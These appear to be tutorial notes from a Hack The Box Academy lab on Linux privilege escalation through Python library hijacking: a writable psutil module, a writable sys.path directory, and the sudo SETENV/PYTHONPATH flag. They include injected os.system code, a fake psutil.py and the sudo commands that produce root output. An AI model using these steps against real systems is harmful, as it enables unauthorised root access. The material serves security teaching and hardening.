## Table of Contents

  - [Table of Contents](#Table\of\Contents)
  - [Wrong Write Permissions](#Wrong\Write\Permissions)
      - [Python Script - Contents](#Python\Script\-\Contents)
      - [Module Permissions](#Module\Permissions)
      - [Module Contents](#Module\Contents)
      - [Module Contents - Hijacking](#Module\Contents\-\Hijacking)
      - [Library Path](#Library\Path)
      - [Psutil Default Installation Location](#Psutil\Default\Installation\Location)
      - [Misconfigured Directory Permissions](#Misconfigured\Directory\Permissions)
      - [Hijacked Module Contents - psutil.py](#Hijacked\Module\Contents\-\psutil.py)
      - [Privilege Escalation via Hijacking Python Library Path](#Privilege\Escalation\via\Hijacking\Python\Library\Path)
  - [PYTHONPATH Environment Variable](#PYTHONPATH\Environment\Variable)
      - [Checking sudo permissions](#Checking\sudo\permissions)
      - [Privilege Escalation using PYTHONPATH Environment variable](#Privilege\Escalation\using\PYTHONPATH\Environment\variable)

## Table of Contents

  - [Wrong Write Permissions](#Wrong\Write\Permissions)
      - [Python Script - Contents](#Python\Script\-\Contents)
      - [Module Permissions](#Module\Permissions)
      - [Module Contents](#Module\Contents)
      - [Module Contents - Hijacking](#Module\Contents\-\Hijacking)
      - [Library Path](#Library\Path)
      - [Psutil Default Installation Location](#Psutil\Default\Installation\Location)
      - [Misconfigured Directory Permissions](#Misconfigured\Directory\Permissions)
      - [Hijacked Module Contents - psutil.py](#Hijacked\Module\Contents\-\psutil.py)
      - [Privilege Escalation via Hijacking Python Library Path](#Privilege\Escalation\via\Hijacking\Python\Library\Path)
  - [PYTHONPATH Environment Variable](#PYTHONPATH\Environment\Variable)
      - [Checking sudo permissions](#Checking\sudo\permissions)
      - [Privilege Escalation using PYTHONPATH Environment variable](#Privilege\Escalation\using\PYTHONPATH\Environment\variable)

There are many ways in which we can hijack a Python library. Much depends on the script and its contents itself. However, there are three basic vulnerabilities where hijacking can be used:

1. Wrong write permissions
2. Library Path
3. PYTHONPATH environment variable


## Wrong Write Permissions
For example, we can imagine that we are in a developer's host on the company's intranew and that the developer is working with python. So we have a total of three components that are connected. This is the actual python script that imports a python module and the privileges of the script as well as the permission of the module.


One or another python module may have write permissions set for all users by mistake. This allows the python module to be edited and manipulated so that we can insert commands or functions that will produce the results we want. If `SUID`/`SGID` permissions have been assigned to the Python script that imports this module, our code will automatically be included.


If we look at the set permissions of the `mem_status.py` script, we can see that it has a `SUID` set.


#### Python Script - Contents

```python
#!/usr/bin/env python3
import psutil

available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total

print(f"Available memory: {round(available_memory, 2)}%")
```

So we can look for this function in the folder of `psutil` and check if this module has write permissions for us.

#### Module Permissions

```shell
htb-student@lpenix:~$ grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*

/usr/local/lib/python3.8/dist-packages/psutil/__init__.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psaix.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psbsd.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pslinux.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psosx.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pssunos.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pswindows.py:def virtual_memory():


htb-student@lpenix:~$ ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py

-rw-r--rw- 1 root staff 87339 Dec 13 20:07 /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
```


Such permissions are most common in developer environments where many developers work on different scripts and may require higher privileges.

#### Module Contents

```python
...SNIP...

def virtual_memory():

	...SNIP...
	
    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret

...SNIP...
```

This is the part in the library where we can insert our code. It is recommended to put it right at the beginning of the function. There we can insert everything we consider correct and effective. We can import the module `os` for testing purposes, which allows us to execute system commands. With this, we can insert the command `id` and check during the execution of the script if the inserted code is executed.

#### Module Contents - Hijacking

```python
...SNIP...

def virtual_memory():

	...SNIP...
	#### Hijacking
	import os
	os.system('id')
	

    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret

...SNIP...
```

#### Library Path
In Python, each version has a specified order in which libraries (`modules`) are searched and imported from. The order in which python imports `modules` from are based on a priority system, meaning that paths higher on the list take priority over ones lower on the list. We can see this by issuing the following command:

```bash
python3 -c 'import sys; print("\n".join(sys.path))'
/usr/lib/python38.zip
/usr/lib/python3.8
/usr/lib/python3.8/lib-dynload
/usr/local/lib/python3.8/dist-packages
/usr/lib/python3/dist-packages
```

To be able to use this variant, two prerequisites are necessary.

1. The module that is imported by the script is located under one of the lower priority paths listed via the `PYTHONPATH` variable.
2. We must have write permissions to one of the paths having a higher priority on the list.

Therefore, if the imported module is located in a path lower on the list and a higher priority path is editable by our user, we can create a module ourselves with the same name and include our own desired functions. Since the higher priority path is read earlier and examined for the module in question, Python accesses the first hit it finds and imports it before reaching the original and intended module.


#### Psutil Default Installation Location

```shell
htb-student@lpenix:~$ pip3 show psutil

...SNIP...
Location: /usr/local/lib/python3.8/dist-packages

...SNIP...
```

From this example, we can see that `psutil` is installed in the following path: `/usr/local/lib/python3.8/dist-packages`. From our previous listing of the `PYTHONPATH` variable, we have a reasonable amount of directories to choose from to see if there might be any misconfigurations in the environment to allow us `write` access to any of them. Let us check.

#### Misconfigured Directory Permissions

Python Library Hijacking

```shell
htb-student@lpenix:~$ ls -la /usr/lib/python3.8
```


After checking all of the directories listed, it appears that `/usr/lib/python3.8` path is misconfigured in a way to allow any user to write to it. Cross-checking with values from the `PYTHONPATH` variable, we can see that this path is higher on the list than the path in which `psutil` is installed in. Let us try abusing this misconfiguration to create our own `psutil` module containing our own malicious `virtual_memory()` function within the `/usr/lib/python3.8` directory.

#### Hijacked Module Contents - psutil.py

```python
#!/usr/bin/env python3

import os

def virtual_memory():
    os.system('id')
```

In order to get to this point, we need to create a file called `psutil.py` containing the contents listed above in the previously mentioned directory. It is very important that we make sure that the module we create has the same name as the import as well as have the same function with the correct number of arguments passed to it as the function we are intending to hijack. This is critical as without either of these conditions being `true`, we will not be able perform this attack. After creating this file containing the example of our previous hijacking script, we have successfully prepped the system for exploitation.

Let us once again run the `mem_status.py` script using `sudo` like in the previous example

#### Privilege Escalation via Hijacking Python Library Path

```shell
htb-student@lpenix:~$ sudo /usr/bin/python3 mem_status.py
```

As we can see from the output, we have successfully gained execution as `root` through hijacking the module's path via a misconfiguration in the permissions of the `/usr/lib/python3.8` directory.

## PYTHONPATH Environment Variable

In the previous section, we touched upon the term `PYTHONPATH`, however, didn't fully explain it's use and importance regarding the functionality of Python. `PYTHONPATH` is an environment variable that indicates what directory (or directories) Python can search for modules to import. This is important as if a user is allowed to manipulate and set this variable while running the python binary, they can effectively redirect Python's search functionality to a `user-defined` location when it comes time to import modules. We can see if we have the permissions to set environment variables for the python binary by checking our `sudo` permissions:

#### Checking sudo permissions

```shell
htb-student@lpenix:~$ sudo -l 

Matching Defaults entries for htb-student on ACADEMY-LPENIX:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on ACADEMY-LPENIX:
    (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
```


As we can see from the example, we are allowed to run `/usr/bin/python3` under the trusted permissions of `sudo` and are therefore allowed to set environment variables for use with this binary by the `SETENV:` flag being set. It is important to note, that due to the trusted nature of `sudo`, any environment variables defined prior to calling the binary are not subject to any restrictions regarding being able to set environment variables on the system. This means that using the `/usr/bin/python3` binary, we can effectively set any environment variables under the context of our running program. Let's try to do so now using the `psutil.py` script from the last section.

#### Privilege Escalation using PYTHONPATH Environment variable
```bash
sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py
uid=0(root) gid=0(root) groups=0(root)
```

In this example, we moved the previous python script from the `/usr/lib/python3.8` directory to `/tmp`. From here we once again call `/usr/bin/python3` to run `mem_stats.py`, however, we specify that the `PYTHONPATH` variable contain the `/tmp` directory so that it forces Python to search that directory looking for the `psutil` module to import. As we can see, we once again have successfully run our script under the context of root.


